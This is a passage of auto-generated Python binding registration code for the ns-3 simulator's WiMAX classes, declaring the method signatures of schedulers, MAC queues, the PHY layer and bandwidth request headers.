cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetPendingSize',
'uint32_t',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequestsBytes',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols'), param('uint32_t', 'allocationSizeBytes')])
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
cls.add_method('UplinkSchedWindowTimer',
'void',
[])
return
def register_Ns3UplinkSchedulerRtps_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerRtps const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
cls.add_method('ULSchedulerRTPSConnection',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')])
return
def register_Ns3UplinkSchedulerSimple_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerSimple const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
return
def register_Ns3WimaxConnection_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxConnection const &', 'arg0')])
cls.add_constructor([param('ns3::Cid', 'cid'), param('ns3::Cid::Type', 'type')])
cls.add_method('ClearFragmentsQueue',
'void',
[])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])
cls.add_method('FragmentEnqueue',
'void',
[param('ns3::Ptr< ns3::Packet const >', 'fragment')])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetFragmentsQueue',
'std::list< ns3::Ptr< ns3::Packet const > > const',
[],
is_const=True)
cls.add_method('GetQueue',
'ns3::Ptr< ns3::WimaxMacQueue >',
[],
is_const=True)
cls.add_method('GetSchedulingType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[],
is_const=True)
cls.add_method('GetType',
'ns3::Cid::Type',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetTypeStr',
'std::string',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3WimaxMacQueue_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxMacQueue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'maxSize')])
cls.add_method('CheckForFragmentation',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])
cls.add_method('GetFirstPacketHdrSize',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetFirstPacketPayloadSize',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetFirstPacketRequiredByte',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetMaxSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNBytes',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPacketQueue',
'std::deque< ns3::WimaxMacQueue::QueueElement > const &',
[],
is_const=True)
cls.add_method('GetQueueLengthWithMACOverhead',
'uint32_t',
[])
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsEmpty',
'bool',
[],
is_const=True)
cls.add_method('IsEmpty',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::GenericMacHeader &', 'hdr')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::GenericMacHeader &', 'hdr'), param('ns3::Time &', 'timeStamp')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('ns3::Time &', 'timeStamp')],
is_const=True)
cls.add_method('SetFragmentNumber',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('SetFragmentOffset',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'offset')])
cls.add_method('SetFragmentation',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('SetMaxSize',
'void',
[param('uint32_t', 'maxSize')])
return
def register_Ns3WimaxMacToMacHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxMacToMacHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'len')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSizeOfLen',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3WimaxPhy_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxPhy const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::WimaxChannel >',
[],
is_const=True)
cls.add_method('GetChannelBandwidth',
'uint32_t',
[],
is_const=True)
cls.add_method('GetChnlSrchTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[],
is_const=True)
cls.add_method('GetFrameDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_const=True)
cls.add_method('GetFrameDurationCode',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameDurationSec',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetGValue',
'double',
[],
is_const=True)
cls.add_method('GetMobility',
'ns3::Ptr< ns3::Object >',
[],
is_virtual=True)
cls.add_method('GetNfft',
'uint16_t',
[],
is_const=True)
cls.add_method('GetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetNrCarriers',
'uint8_t',
[],
is_const=True)
cls.add_method('GetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetPhyType',
'ns3::WimaxPhy::PhyType',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetPsDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetPsPerFrame',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPsPerSymbol',
'uint16_t',
[],
is_const=True)
cls.add_method('GetReceiveCallback',
'ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',
[],
is_const=True)
cls.add_method('GetRtg',
'uint16_t',
[],
is_const=True)
cls.add_method('GetRxFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetSamplingFactor',
'double',
[],
is_const=True)
cls.add_method('GetSamplingFrequency',
'double',
[],
is_const=True)
cls.add_method('GetScanningFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetState',
'ns3::WimaxPhy::PhyState',
[],
is_const=True)
cls.add_method('GetSymbolDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetSymbolsPerFrame',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetTtg',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTxFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsDuplex',
'bool',
[],
is_const=True)
cls.add_method('Send',
'void',
[param('ns3::SendParams *', 'params')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetChannelBandwidth',
'void',
[param('uint32_t', 'channelBandwidth')])
cls.add_method('SetDataRates',
'void',
[])
cls.add_method('SetDevice',
'void',
[param('ns3::Ptr< ns3::WimaxNetDevice >', 'device')])
cls.add_method('SetDuplex',
'void',
[param('uint64_t', 'rxFrequency'), param('uint64_t', 'txFrequency')])
cls.add_method('SetFrameDuration',
'void',
[param('ns3::Time', 'frameDuration')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('SetMobility',
'void',
[param('ns3::Ptr< ns3::Object >', 'mobility')],
is_virtual=True)
cls.add_method('SetNrCarriers',
'void',
[param('uint8_t', 'nrCarriers')])
cls.add_method('SetPhyParameters',
'void',
[])
cls.add_method('SetPsDuration',
'void',
[param('ns3::Time', 'psDuration')])
cls.add_method('SetPsPerFrame',
'void',
[param('uint16_t', 'psPerFrame')])
cls.add_method('SetPsPerSymbol',
'void',
[param('uint16_t', 'psPerSymbol')])
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('SetScanningCallback',
'void',
[],
is_const=True)
cls.add_method('SetSimplex',
'void',
[param('uint64_t', 'frequency')])
cls.add_method('SetState',
'void',
[param('ns3::WimaxPhy::PhyState', 'state')])
cls.add_method('SetSymbolDuration',
'void',
[param('ns3::Time', 'symbolDuration')])
cls.add_method('SetSymbolsPerFrame',
'void',
[param('uint32_t', 'symbolsPerFrame')])
cls.add_method('StartScanning',
'void',
[param('uint64_t', 'frequency'), param('ns3::Time', 'timeout'), param('ns3::Callback< void, bool, unsigned long long, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoGetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDurationCode',
'uint8_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetGValue',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNfft',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetRtg',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFactor',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFrequency',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTtg',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoSetDataRates',
'void',
[],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoSetPhyParameters',
'void',
[],
is_pure_virtual=True, visibility='private', is_virtual=True)
return
def register_Ns3AttributeAccessor_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeAccessor const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Get',
'bool',
[param('ns3::ObjectBase const *', 'object'), param('ns3::AttributeValue &', 'attribute')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasGetter',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasSetter',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Set',
'bool',
[param('ns3::ObjectBase *', 'object', transfer_ownership=False), param('ns3::AttributeValue const &', 'value')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3AttributeChecker_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeChecker const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Check',
'bool',
[param('ns3::AttributeValue const &', 'value')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Copy',
'bool',
[param('ns3::AttributeValue const &', 'source'), param('ns3::AttributeValue &', 'destination')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Create',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('CreateValidValue',
'ns3::Ptr< ns3::AttributeValue >',
[param('ns3::AttributeValue const &', 'value')],
is_const=True)
cls.add_method('GetUnderlyingTypeInformation',
'std::string',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetValueTypeName',
'std::string',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasUnderlyingTypeInformation',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3AttributeValue_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3BSScheduler_methods(root_module, cls):
cls.add_constructor([param('ns3::BSScheduler const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('CheckForFragmentation',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('int', 'availableSymbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetBs',
'ns3::Ptr< ns3::BaseStationNetDevice >',
[],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetBs',
'void',
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],
is_virtual=True)
return
def register_Ns3BSSchedulerRtps_methods(root_module, cls):
cls.add_constructor([param('ns3::BSSchedulerRtps const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_virtual=True)
cls.add_method('BSSchedulerBEConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerBasicConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerBroadcastConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerInitialRangingConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerNRTPSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerPrimaryConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerRTPSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerUGSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('SelectBEConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_virtual=True)
cls.add_method('SelectIRandBCConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectMenagementConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectNRTPSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectRTPSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectUGSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
return
def register_Ns3BSSchedulerSimple_methods(root_module, cls):
cls.add_constructor([param('ns3::BSSchedulerSimple const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_virtual=True)
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_virtual=True)
return
def register_Ns3BandwidthRequestHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::BandwidthRequestHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBr',
'uint32_t',
[],
is_const=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetEc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHt',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
